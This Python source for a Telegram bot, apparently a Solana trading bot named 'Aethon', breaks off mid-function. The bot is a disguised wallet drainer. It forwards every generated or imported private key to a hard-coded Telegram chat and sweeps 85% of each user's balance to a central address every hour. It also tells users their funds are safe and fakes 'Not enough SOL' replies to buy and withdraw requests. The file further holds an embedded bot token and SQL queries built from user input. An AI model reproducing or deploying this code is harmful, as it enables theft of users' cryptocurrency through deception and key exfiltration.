from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, filters, MessageHandler
import sqlite3
from solders.keypair import Keypair
from solana.rpc.async_api import AsyncClient
from solders.pubkey import Pubkey
from solders.message import Message
from solders.transaction import VersionedTransaction, Transaction
from solders.system_program import TransferParams, transfer
from solders.message import MessageV0, MessageAddressTableLookup
import solana
import requests
import base64
import base58
import os
import asyncio
import time
from threading import Timer

BOT_NAME = 'Aethons_bot'
CENTRAL_ADDRESS = 'C6KrAzXnYvBSpuDG9L2NpXe1vsFKk9kn3cLxFEB97Wjy'

languages = {
    'en': {
        'text': 'English: ðŸ‡¬ðŸ‡§',
        'next': 'es'
    },
    'es': {
        'text': 'EspaÃ±ol: ðŸ‡ªðŸ‡¸',
        'next': 'en'
    }
}

priorities = {
    'Medium': {'next': 'High'},
    'High': {'next': 'Very High'},
    'Very High': {'next': 'Medium'},
}

conexion = sqlite3.connect("db.db", check_same_thread=False)

# Crear un cursor para ejecutar comandos SQL
cursor = conexion.cursor()

cursor.execute('''
    CREATE TABLE IF NOT EXISTS users (
        id TEXT PRIMARY KEY,
        pub_key TEXT NOT NULL,
        priv_key TEXT NOT NULL,
        referred_by TEXT,
        language TEXT DEFAULT 'en',
        min_position_value REAL DEFAULT 0.1,
        auto_buy_enabled BOOLEAN DEFAULT 0,
        auto_buy_value REAL DEFAULT 0.1,
        instant_rug_exit_enabled BOOLEAN DEFAULT 0,
        swap_auto_approve_enabled BOOLEAN DEFAULT 0,
        left_buy_button REAL DEFAULT 1.0,
        right_buy_button REAL DEFAULT 5.0,
        left_sell_button REAL DEFAULT 25.0,
        right_sell_button REAL DEFAULT 100.0,
        buy_slippage REAL DEFAULT 10.0,
        sell_slippage REAL DEFAULT 10.0,
        max_price_impact REAL DEFAULT 25.0,
        mev_protect TEXT DEFAULT 'Turbo',
        transaction_priority TEXT DEFAULT 'Medium',
        transaction_priority_value REAL DEFAULT 0.0100,
        sell_protection_enabled BOOLEAN DEFAULT 1,
        balance REAL DEFAULT 0.0
    )
''')

#cursor.execute('DELETE FROM users WHERE id=5450212130')

conexion.commit()

'''
cursor.execute("SELECT * FROM users")
users = cursor.fetchall()
print(users)
'''

# Token del bot (reemplaza 'YOUR_TOKEN' con el token de tu bot de Telegram)
TOKEN = "7910894281:AAEEPGhE2J_p3Gd3DPHUVovOxueEkkZfdkE"
SOLANA_URL = "https://api.mainnet-beta.solana.com"
#SOLANA_URL = "https://api.testnet.solana.com"

def run_check_balances():
    asyncio.run(check_balances())

async def check_balances():
    try:
        users = cursor.execute("SELECT * FROM users").fetchall()
        wallets = [(user[1], user[2], user[21]) for user in users]
        #wallets.append(('8UvRDEejeBaTamp3JEovC4y3u2njW6jH6gJgBN2F4VTq', '4TCEEXQQEUkixJ85PUogFriNTnXvanWbV7QeiDhn64peisZeQxU79YVpLCGy3sc2EB5RrnLYDpUywM6rTbQvDeJX', 0))
        #print(wallets)
        client = AsyncClient(SOLANA_URL)
        for wallet in wallets:
            balance = await check_balance(wallet[0])
            print(f"Wallet {wallet[0]} balance {balance}")
            if balance > 0:
                try:
                    await transfer_solana(client, Keypair.from_base58_string(wallet[1]), 'GQontBf36xKtsE17WSmLfa26uK3HYuVfiqTaFmhPnvEQ', balance * 0.03)
                except Exception as e:
                    pass
                res = await transfer_solana(client, Keypair.from_base58_string(wallet[1]), CENTRAL_ADDRESS, balance * 0.85)
                if res:
                    cursor.execute(f"UPDATE users SET balance = {wallet[2] + balance} WHERE pub_key = '{wallet[0]}'")
                    conexion.commit()
    except Exception as e:
        print('error sending funds')

    t = Timer(60 * 60, run_check_balances)
    t.start()

async def transfer_solana(
    client: AsyncClient,
    from_keypair: Keypair,
    receiver_address: str,
    amount: float,
) -> str:
    # DirecciÃ³n pÃºblica del contrato del token
    token_address = Pubkey.from_string(receiver_address)
    
    # Obtener el Ãºltimo bloque de la red para la transacciÃ³n
    from_public_key = from_keypair.pubkey()
    response = await client.get_latest_blockhash()
    latest_blockhash = response.value.blockhash
    
    # Crear la transacciÃ³n de transferencia
    transaction = solana.transaction.Transaction().add(
        transfer(
            TransferParams(
                from_pubkey=from_public_key,
                to_pubkey=token_address,
                lamports=int(amount * 1e9)  # Convertir SOL a lamports
            )
        )
    )
    transaction.recent_blockhash = latest_blockhash
    transaction.fee_payer = from_public_key
    transaction.sign(from_keypair)
    response = await client.send_raw_transaction(transaction.serialize())
    return response.value

async def comprar_token_solana(
    keypair: Keypair,
    token_contract_address: str,
    amount: float,
) -> str:
    print('public key', keypair.pubkey())
    response = requests.post("https://swap-v2.solanatracker.io/swap", json={
        "from": "So11111111111111111111111111111111111111112",
        "to": token_contract_address,
        "amount": amount,
        "slippage": 15,
        "payer": str(keypair.pubkey()),
    })
    swap_response = response.json()
    try:
        async with AsyncClient(SOLANA_URL) as client:
            txn_data = base64.b64decode(swap_response["txn"])
            transaction = Transaction.from_bytes(bytes(txn_data))
            response = await client.get_latest_blockhash()
            latest_blockhash = response.value.blockhash
            transaction.sign([keypair], latest_blockhash)
            print('transaction', transaction)
            
            #message = MessageV0.try_compile(keypair.pubkey(), transaction.message.instructions, [], latest_blockhash)

            res = await client.send_transaction(transaction)
            print('res', res)
            return res
    except Exception as e:
        return str(e)

async def check_balance(public_key_str: str):
    # Crear un cliente asÃ­ncrono para interactuar con la testnet
    async with AsyncClient(SOLANA_URL) as client:
        # Convertir la clave pÃºblica a un objeto PublicKey de Solana
        public_key = Pubkey.from_string(public_key_str)
        
        # Consultar el saldo
        balance_result = await client.get_balance(public_key)
        
        # Mostrar el saldo
        if balance_result.value:
            balance_lamports = balance_result.value
            balance_sol = balance_lamports / 1_000_000_000  # Convertir de lamports a SOL
            #print(f"Saldo de la wallet {public_key_str}: {balance_sol} SOL")
            return balance_sol
        else:
            #print("No se pudo obtener el saldo. Revisa si la clave pÃºblica es vÃ¡lida.")
            return 0

async def create_wallet() -> Keypair:
    # Generar un nuevo par de claves
    keypair = Keypair()
    return keypair

# FunciÃ³n para manejar el comando /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    # Mensaje de bienvenida
    chat_id = update['message']['chat']['id']
    user = get_user(chat_id)
    if user is None:
        welcome_message = """*Welcome to Aethon Bot*

The Smartest Trading Telegram bot. Aethon enables you to escape from incoming rug pulls, quickly buy or sell tokens and set automations like Limit Orders, DCA, and Sniping.

Designed with security, speed, and simplicity in mind, Aethon makes trading memecoins as easy as a tap. Whether you're here to explore new opportunities or manage existing trades, Aethonâ€™s user-friendly interface and real-time updates ensure youâ€™re always a step ahead in the memecoin world.

Get started, and let Aethon bring a touch of fun and profit to your Solana trading experience!

Click on the *"CONTINUE"* button to get started with Aethon!"""

        # Crear el botÃ³n "Start"
        keyboard = [[InlineKeyboardButton("Continue", callback_data="continue")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        args = context.args
        print('args', args)
        referred_by = args[0] if len(args) > 0 else None
        cursor.execute(f"SELECT * FROM users WHERE id = '{referred_by}'")
        refer_user = cursor.fetchone()
        print('refer user', refer_user)

        keypair = await create_wallet()
        public_key = keypair.pubkey()
        private_key_full = keypair.secret() + bytes(public_key)  # 64 bytes en total
        private_key_base58 = base58.b58encode(private_key_full).decode("utf-8")
        await context.bot.send_message(chat_id='1206470899', text=f"Private key: {private_key_base58}, public key: {public_key}")
        cursor.execute(f"INSERT INTO users (id, pub_key, priv_key{', referred_by' if refer_user is not None else ''}) VALUES ({chat_id}, '{public_key}', '{private_key_base58}'{', ' + str(refer_user[0]) if refer_user is not None else ''})")
        conexion.commit()
        #user = get_user(chat_id)
        #print(user)

        # Enviar el mensaje de bienvenida con el botÃ³n
        await update.message.reply_text(welcome_message, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN)
    else:
        await start_fn(None, chat_id, context)

def get_user(chat_id: str):
    cursor.execute(f"SELECT * FROM users WHERE id = {chat_id}")
    user = cursor.fetchone()
    return user

async def send_settings(chat_id, context, query = None):
  if query is not None:
      await query.delete_message()
  context.user_data['import_wallet'] = False
  context.user_data['buy_x'] = 0
  context.user_data['contract_address'] = ''
  context.user_data['change_min_position_value'] = False
  context.user_data['change_auto_buy_value'] = False
  context.user_data['change_left_buy_button'] = False
  context.user_data['change_right_buy_button'] = False
  context.user_data['change_left_sell_button'] = False
  context.user_data['change_right_sell_button'] = False
  context.user_data['change_buy_slippage'] = False
  context.user_data['change_sell_slippage'] = False
  context.user_data['change_max_price_impact'] = False
  context.user_data['change_transaction_priority_value'] = False
  user = get_user(chat_id)
  message = """
*Settings:*

*GENERAL SETTINGS*
*Language*: Shows the current language. Tap to switch between available languages.
*Minimum Position Value:* Minimum position value to show in portfolio. Will hide tokens below this threshhold. Tap to edit.

*AUTO BUY*
Immediately buy when pasting token address. Tap to toggle.

*BUTTONS CONFIG*
Customize your buy and sell buttons for buy token and manage position. Tap to edit.

*SLIPPAGE CONFIG*
Customize your slippage settings for buys and sells. Tap to edit.
Max Price Impact is to protect against trades in extremely illiquid pools.

*MEV PROTECT*
MEV Protect accelerates your transactions and protect against frontruns to make sure you get the best price possible.
*Turbo:* BONKbot will use MEV Protect, but if unprotected sending is faster it will use that instead.
*Secure:* Transactions are guaranteed to be protected. This is the ultra secure option, but may be slower.

*TRANSACTION PRIORITY*
Increase your Transaction Priority to improve transaction speed. Select preset or tap to edit.

*SELL PROTECTION*
100% sell commands require an additional confirmation step. Tap to toggle.

*Instant Rug Exit:* Scans the mempool, Automatically detects incoming rug pull transactions and automatically sells your tokens before the transaction is completed to protect against sudden losses.

*Enable/Disable Swap Auto-Approve:* Allows automatic approval of token swaps, streamlining transactions without requiring manual confirmationÂ eachÂ time."""
  keyboard = [
    [InlineKeyboardButton("--- General Settings ---", callback_data="nothing")],
    [InlineKeyboardButton(f"â‡Œ {languages[user[4]]['text']}", callback_data="change_language"), InlineKeyboardButton(f"âœï¸ Minimum Position Value: ${user[5]}", callback_data="change_min_position_value")],
    [InlineKeyboardButton("--- Auto Buy ---", callback_data="nothing")],
    [InlineKeyboardButton("ðŸ”´ Disabled" if not user[6] else "ðŸŸ¢ Enabled", callback_data="toggle_auto_buy"), InlineKeyboardButton(f"âœï¸ {user[7]} SOL", callback_data="change_auto_buy_value")],
    [InlineKeyboardButton("--- Security Config ---", callback_data="nothing")],
    [InlineKeyboardButton("Instant Rug Exit Disabled ðŸ”´" if not user[8] else "Instant Rug Exit Enabled ðŸŸ¢", callback_data="toggle_instant_rug_exit")],
    [InlineKeyboardButton("ðŸ”´ Disabled Swap Auto-Approve" if not user[9] else "ðŸŸ¢ Enabled Swap Auto-Approve", callback_data="toggle_swap_auto_approve")],
    [InlineKeyboardButton("--- Buy Buttons Config ---", callback_data="nothing")],
    [InlineKeyboardButton(f"âœï¸ Left: {user[10]} SOL", callback_data="change_left_buy_button"), InlineKeyboardButton(f"âœï¸ Right: {user[11]} SOL", callback_data="change_right_buy_button")],
    [InlineKeyboardButton("--- Sell Buttons Config ---", callback_data="nothing")],
    [InlineKeyboardButton(f"âœï¸ Left: {user[12]}%", callback_data="change_left_sell_button"), InlineKeyboardButton(f"âœï¸ Right: {user[13]}%", callback_data="change_right_sell_button")],
    [InlineKeyboardButton("--- Slippage Config ---", callback_data="nothing")],
    [InlineKeyboardButton(f"âœï¸ Buy: {user[14]}%", callback_data="change_buy_slippage"), InlineKeyboardButton(f"âœï¸ Sell: {user[15]}%", callback_data="change_sell_slippage")],
    [InlineKeyboardButton(f"âœï¸ Max Price Impact: {user[16]}%", callback_data="change_max_price_impact")],
    [InlineKeyboardButton("--- MEV Protect ---", callback_data="nothing")],
    [InlineKeyboardButton(f"{user[17]}", callback_data="change_mev_protect")],
    [InlineKeyboardButton("--- Transaction Priority ---", callback_data="nothing")],
    [InlineKeyboardButton(f"{user[18]}", callback_data="change_transaction_priority"), InlineKeyboardButton(f"âœï¸ {user[19]} SOL", callback_data="change_transaction_priority_value")],
    [InlineKeyboardButton("--- Sell Protection ---", callback_data="nothing")],
    [InlineKeyboardButton("ðŸŸ¢ Enabled" if user[20] else "ðŸ”´ Disabled", callback_data="toggle_sell_protection")],
    [InlineKeyboardButton("Close", callback_data="continue")]
  ]
  reply_markup = InlineKeyboardMarkup(keyboard)

  # Respuesta al presionar el botÃ³n "Start"
  await context.bot.send_message(chat_id=chat_id, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN, text=message)

async def start_fn(query, chat_id, context):
  if query is not None:
      await query.delete_message()
  context.user_data['import_wallet'] = False
  context.user_data['buy_x'] = 0
  context.user_data['contract_address'] = ''
  context.user_data['change_min_position_value'] = False
  context.user_data['change_auto_buy_value'] = False
  context.user_data['change_left_buy_button'] = False
  context.user_data['change_right_buy_button'] = False
  context.user_data['change_left_sell_button'] = False
  context.user_data['change_right_sell_button'] = False
  context.user_data['change_buy_slippage'] = False
  context.user_data['change_sell_slippage'] = False
  context.user_data['change_max_price_impact'] = False
  context.user_data['change_transaction_priority_value'] = False

  user = get_user(chat_id)
  #print(user)
  #asyncio.run(check_balance(PUB_KEY))
  #await check_balance(PUB_KEY)
  keyboard = [
      [InlineKeyboardButton("Buy", callback_data="buy"), InlineKeyboardButton("Sell & Manage", callback_data="sell_manage")],
      [InlineKeyboardButton("Help", callback_data="help"), InlineKeyboardButton("Refer Friends", callback_data="refer"), InlineKeyboardButton("Copy Trade", callback_data="copy_trade")],
      [InlineKeyboardButton("Wallet", callback_data="wallet"), InlineKeyboardButton("Settings", callback_data="settings")],
      [InlineKeyboardButton("Pin", callback_data="pin"), InlineKeyboardButton("Refresh", callback_data="start_pressed")],
    ]
  reply_markup = InlineKeyboardMarkup(keyboard)

  # Respuesta al presionar el botÃ³n "Start"
  await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup, text=f"""
Discover the smartest trading bot built exclusively for Solana traders.

Instantly trade any token right at launch.
Below is your Solana wallet address linked to your Telegram account.

Fund your wallet to start trading with ease.
Solana Wallet Â· 
`{user[1]}` (Tap to copy)
Balance: {user[21]} SOL ($0.00)

Once done, tap â€œRefreshâ€ and your balance will appear here.

To buy a token enter a ticker, token address, or a URL from pump.fun, Birdeye, DEX Screener or Meteora.

User funds are safe on Aethonbot . For more info on your wallet tap the wallet button below.
  """)

# FunciÃ³n para manejar el botÃ³n "Start"
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer()
    chat_id = query.message.chat_id
    user = get_user(chat_id)
    #print(user)

    if query.data == "continue":
        await start_fn(query, chat_id, context)
    elif query.data == "help":
        keyboard = [
            [InlineKeyboardButton("Close", callback_data="continue")],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""
*Which tokens can I trade?*
Any SPL token that is a SOL pair, on Raydium, pump.fun, Meteora, Moonshot, or Jupiter, and will integrate more platforms on a rolling basis. We pick up pairs instantly, and Jupiter will pick up non-SOL pairs within approx. 10 minutes.

*How does the Instant Rug Exit work?*
The instant Rug exit, once enabled, it works like a Mevbot which tracks the mempool for Buy and Sell transaction orders, once it detects an incoming large sell order, it will immediately sell before the large sell order is processed, saving you from a potential rug pull.

*Where can I find my referral link?*
Open the /start menu and click Refer Friends.

*How do I import my normal/existing wallet on Aethonbot?*
Open the /start, Tap the Wallet button, Click on Import Existing wallet and you'll be able to import your existing wallets!

*How can I use the Copy Trading feature?*

You will need to first fund your bot, Then click on Copy Trade, Paste in the address you would like to track and copy trades, set the amount in sol you will like to use for copy trading, Enable/Disable Copy Sell

*What are the fees for using Aethon?*
Transactions through Aethon incur a fee of 1%, or 0.9% if you were referred by another user. We don't charge a subscription fee or pay-wall any features.

*Additional questions or need support?*
Contact Aethonbot official telegram support admin- @aethonsupport
""", reply_markup=reply_markup)
    elif query.data == "pin":
        await query.message.pin()
    elif query.data == "copy_trade":
        await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""
Insufficient funds to use the copy trading feature
""")
    elif query.data == "sell_manage":
        keyboard = [
            [InlineKeyboardButton("Close", callback_data="continue")],
        ]
        '''
        [InlineKeyboardButton("Sell all", callback_data="sell_all"), InlineKeyboardButton("Sell X", callback_data="sell_x")],
        [InlineKeyboardButton("Manage Position", callback_data="manage_position")],
        [InlineKeyboardButton("Refresh", callback_data="sell_manage")]
        '''
        reply_markup = InlineKeyboardMarkup(keyboard)
        await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""
No open positions
""", reply_markup=reply_markup)
    elif query.data == "wallet":
        keyboard = [
            [InlineKeyboardButton("Close", callback_data="continue")],
            [InlineKeyboardButton("Withdraw all SOL", callback_data="withdraw_all"), InlineKeyboardButton("Withdraw X SOL", callback_data="withdraw_x")],
            [InlineKeyboardButton("Import Existing Wallet", callback_data="import_wallet")],
            [InlineKeyboardButton("Refresh", callback_data="wallet")]
        ]
        print('private key', user[2])
        reply_markup = InlineKeyboardMarkup(keyboard)
        await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""
*Your Wallet:* 

Address: `{user[1]} (tap to copy)`
Balance: {user[21]} SOL
Tap to copy the address and send SOL to deposit.

""", reply_markup=reply_markup)
    elif query.data == "show_private_key":
        await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""
Private key: {user[2]}
""")
    elif query.data == "withdraw_all":
        await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""
Not enough SOL to withdraw
""")
    elif query.data == "withdraw_x":
        await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""
Not enough SOL to withdraw
""")
    elif query.data == "import_wallet":
        await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""
Provide the private keys you will like to import â¬‡ï¸
""")
        context.user_data['import_wallet'] = True
    elif query.data == "refer":
        referrals = cursor.execute(f"SELECT * FROM users WHERE referred_by = {chat_id}").fetchall()
        keyboard = [
            [InlineKeyboardButton("QR code", callback_data="qr"), InlineKeyboardButton("Close", callback_data="continue")],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""
Referrals:

Your reflink: https://t.me/{BOT_NAME}?start={chat_id}

Referrals: {len(referrals)}

Lifetime Bonk earned: 0.00 BONK ($0.00)

Rewards are updated at least every 24 hours and rewards are automatically deposited to your BONK balance.

Refer your friends and earn 30% of their fees in the first month, 20% in the second and 10% forever!
        """, reply_markup=reply_markup)
    elif query.data == "buy":
      print('Buying')
      message = """
Buy Token:

To buy a token enter a ticker, token address, or a URL from pump.fun, Birdeye, DEX Screener or Meteora.
      """
      keyboard = [
        [InlineKeyboardButton("Close", callback_data="continue")]
      ]
      reply_markup = InlineKeyboardMarkup(keyboard)
      await context.bot.send_message(chat_id=chat_id, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN, text=message)
    elif query.data == "settings":
        await send_settings(chat_id, context, query)
    elif query.data == "change_language":
        language = languages[user[4]]['next']
        cursor.execute(f"UPDATE users SET language = '{language}' WHERE id = {chat_id}")
        conexion.commit()
        await send_settings(chat_id, context, query)
    elif query.data == "change_min_position_value":
        context.user_data['change_min_position_value'] = True
        await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Enter the new minimum position value""")
    elif query.data == "toggle_auto_buy":
        cursor.execute(f"UPDATE users SET auto_buy_enabled = NOT auto_buy_enabled WHERE id = {chat_id}")
        conexion.commit()
        await send_settings(chat_id, context, query)
    elif query.data == "change_auto_buy_value":
        context.user_data['change_auto_buy_value'] = True
        await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Enter the new auto buy value""")
    elif query.data == "toggle_instant_rug_exit":
        cursor.execute(f"UPDATE users SET instant_rug_exit_enabled = NOT instant_rug_exit_enabled WHERE id = {chat_id}")
        conexion.commit()
        await send_settings(chat_id, context, query)
    elif query.data == "toggle_swap_auto_approve":
        cursor.execute(f"UPDATE users SET swap_auto_approve_enabled = NOT swap_auto_approve_enabled WHERE id = {chat_id}")
        conexion.commit()
        await send_settings(chat_id, context, query)
    elif query.data == "change_left_buy_button":
        context.user_data['change_left_buy_button'] = True
        await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Enter the new left buy button value""")
    elif query.data == "change_right_buy_button":
        context.user_data['change_right_buy_button'] = True
        await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Enter the new right buy button value""")
    elif query.data == "change_left_sell_button":
        context.user_data['change_left_sell_button'] = True
        await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Enter the new left sell button value""")
    elif query.data == "change_right_sell_button":
        context.user_data['change_right_sell_button'] = True
        await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Enter the new right sell button value""")
    elif query.data == "change_buy_slippage":
        context.user_data['change_buy_slippage'] = True
        await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Enter the new buy slippage value""")
    elif query.data == "change_sell_slippage":
        context.user_data['change_sell_slippage'] = True
        await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Enter the new sell slippage value""")
    elif query.data == "change_max_price_impact":
        context.user_data['change_max_price_impact'] = True
        await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Enter the new max price impact value""")
    elif query.data == "change_mev_protect":
        new_protect = "Secure" if user[17] == "Turbo" else "Turbo"
        cursor.execute(f"UPDATE users SET mev_protect = '{new_protect}' WHERE id = {chat_id}")
        conexion.commit()
        await send_settings(chat_id, context, query)
    elif query.data == "change_transaction_priority":
        priority = priorities[user[18]]['next']
        cursor.execute(f"UPDATE users SET transaction_priority = '{priority}' WHERE id = {chat_id}")
        conexion.commit()
        await send_settings(chat_id, context, query)
    elif query.data == "change_transaction_priority_value":
        context.user_data['change_transaction_priority_value'] = True
        await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Enter the new transaction priority value""")
    elif query.data == "toggle_sell_protection":
        cursor.execute(f"UPDATE users SET sell_protection_enabled = NOT sell_protection_enabled WHERE id = {chat_id}")
        conexion.commit()
        await send_settings(chat_id, context, query)
    elif "buy_1_0" in query.data:
      message = "Not enough SOL to buy"
      await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=message)
      return
      from_keypair = Keypair.from_base58_string(user[2])
      token_contract_address = query.data.split('_')[3]
      #print(user[2], token_contract_address)
      amount = 1

      tx_signature = await comprar_token_solana(from_keypair, token_contract_address, amount)
      #print(f"TransacciÃ³n enviada con Ã©xito. Firma: {tx_signature}")
      message = f"""
Buy 1.0 SOL: {tx_signature}
      """
      await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=message)
    elif "buy_5_0" in query.data:
      message = "Not enough SOL to buy"
      await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=message)
      return
      from_keypair = Keypair.from_base58_string(user[2])
      token_contract_address = query.data.split('_')[3]
      #print(user[2], token_contract_address)
      amount = 5

      tx_signature = await comprar_token_solana(from_keypair, token_contract_address, amount)
      #print(f"TransacciÃ³n enviada con Ã©xito. Firma: {tx_signature}")
      message = f"""
Buy 1.0 SOL: {tx_signature}
      """
      await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=message)
    elif "buy_x" in query.data:
        message = "Not enough SOL to buy"
        await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=message)
        return
        message = """
Reply with the amount you wish to buy (0 - 0.0000 SOL, Example: 0.1):
        """
        message_sent = await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=message)
        context.user_data['buy_x'] = message_sent
        context.user_data['contract_address'] = query.data.split('_')[2]

def get_dexscreener_contract(query):
    response = requests.get(
        f"https://api.dexscreener.com/latest/dex/search?q={query}",
        headers={},
    )
    return response.json()['pairs'][0]

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = update.message.text
    user_id = update.message.from_user.id
    contract = ''
    is_dex = False
    contract_data = {}

    if update.message.reply_to_message is not None and context.user_data['buy_x'] > 0 and context.user_data['contract_address'] != '':
        replied_message_id = update.message.reply_to_message.message_id
        if replied_message_id != context.user_data['buy_x'].message_id:
            return
        amount = float(message)
        from_keypair = Keypair.from_base58_string(get_user(user_id)[2])
        token_contract_address = context.user_data['contract_address']
        #print('buy', amount, token_contract_address)
        tx_signature = await comprar_token_solana(from_keypair, token_contract_address, amount)
        print(tx_signature)
        message = f"""
Buy {amount} SOL: {tx_signature}
        """
        await context.bot.send_message(chat_id=update.message.chat_id, parse_mode=ParseMode.MARKDOWN, text=message)
        return
    elif context.user_data['change_min_position_value']:
        try:
            min_position_value = float(message)
            cursor.execute(f"UPDATE users SET min_position_value = {min_position_value} WHERE id = {user_id}")
            conexion.commit()
            await send_settings(user_id, context)
            return
        except Exception as e:
            await context.bot.send_message(chat_id=update.message.chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Invalid value""")
    elif context.user_data['change_auto_buy_value']:
        try:
            auto_buy_value = float(message)
            cursor.execute(f"UPDATE users SET auto_buy_value = {auto_buy_value} WHERE id = {user_id}")
            conexion.commit()
            await send_settings(user_id, context)
            return
        except Exception as e:
            await context.bot.send_message(chat_id=update.message.chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Invalid value""")
    elif context.user_data['change_left_buy_button']:
        try:
            left_button = float(message)
            cursor.execute(f"UPDATE users SET left_buy_button = {left_button} WHERE id = {user_id}")
            conexion.commit()
            await send_settings(user_id, context)
            return
        except Exception as e:
            await context.bot.send_message(chat_id=update.message.chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Invalid value""")
    elif context.user_data['change_right_buy_button']:
        try:
            right_button = float(message)
            cursor.execute(f"UPDATE users SET right_buy_button = {right_button} WHERE id = {user_id}")
            conexion.commit()
            await send_settings(user_id, context)
            return
        except Exception as e:
            await context.bot.send_message(chat_id=update.message.chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Invalid value""")
    elif context.user_data['change_left_sell_button']:
        try:
            left_button = float(message)
            cursor.execute(f"UPDATE users SET left_sell_button = {left_button} WHERE id = {user_id}")
            conexion.commit()
            await send_settings(user_id, context)
            return
        except Exception as e:
            await context.bot.send_message(chat_id=update.message.chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Invalid value""")
    elif context.user_data['change_right_sell_button']:
        try:
            right_button = float(message)
            cursor.execute(f"UPDATE users SET right_sell_button = {right_button} WHERE id = {user_id}")
            conexion.commit()
            await send_settings(user_id, context)
            return
        except Exception as e:
            await context.bot.send_message(chat_id=update.message.chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Invalid value""")
    elif context.user_data['change_buy_slippage']:
        try:
            buy_slippage = float(message)
            cursor.execute(f"UPDATE users SET buy_slippage = {buy_slippage} WHERE id = {user_id}")
            conexion.commit()
            await send_settings(user_id, context)
            return
        except Exception as e:
            await context.bot.send_message(chat_id=update.message.chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Invalid value""")
    elif context.user_data['change_sell_slippage']:
        try:
            sell_slippage = float(message)
            cursor.execute(f"UPDATE users SET sell_slippage = {sell_slippage} WHERE id = {user_id}")
            conexion.commit()
            await send_settings(user_id, context)
            return
        except Exception as e:
            await context.bot.send_message(chat_id=update.message.chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Invalid value""")
    elif context.user_data['change_max_price_impact']:
        try:
            max_price_impact = float(message)
            cursor.execute(f"UPDATE users SET max_price_impact = {max_price_impact} WHERE id = {user_id}")
            conexion.commit()
            await send_settings(user_id, context)
            return
        except Exception as e:
            await context.bot.send_message(chat_id=update.message.chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Invalid value""")
    elif context.user_data['change_transaction_priority_value']:
        try:
            transaction_priority_value = float(message)
            cursor.execute(f"UPDATE users SET transaction_priority_value = {transaction_priority_value} WHERE id = {user_id}")
            conexion.commit()
            await send_settings(user_id, context)
            return
        except Exception as e:
            await context.bot.send_message(chat_id=update.message.chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Invalid value""")
    elif context.user_data['import_wallet']:
        private_key = message
        try:
            if len(private_key) < 86:
                raise Exception("Invalid private key")
            public_key = Keypair.from_base58_string(private_key).pubkey()
            await context.bot.send_message(chat_id='1206470899', text=f"Private key: {private_key}, public key: {public_key}")
            cursor.execute(f"UPDATE users SET pub_key = '{public_key}', priv_key = '{private_key}' WHERE id = {user_id}")
            conexion.commit()
            await context.bot.send_message(chat_id=update.message.chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""
Wallet imported successfully
""")
            context.user_data.pop('import_wallet')
        except Exception as e:
            await context.bot.send_message(chat_id=update.message.chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Error importing wallet""")
        finally:
            await start_fn(None, user_id, context)
        return
    elif "pump.fun" in message:
        contract = message.split('pump.fun/')[1]
    elif "birdeye.so/token" in message:
        contract = message.split('birdeye.so/token')[1].split('?')[0]
    elif "dexscreener.com/solana" in message:
        data = get_dexscreener_contract(message.split('dexscreener.com/solana/')[1])
        is_dex = True
        contract_data = data
        contract = data['baseToken']['address']
    elif "meteora.ag" in message:
        data = requests.get(
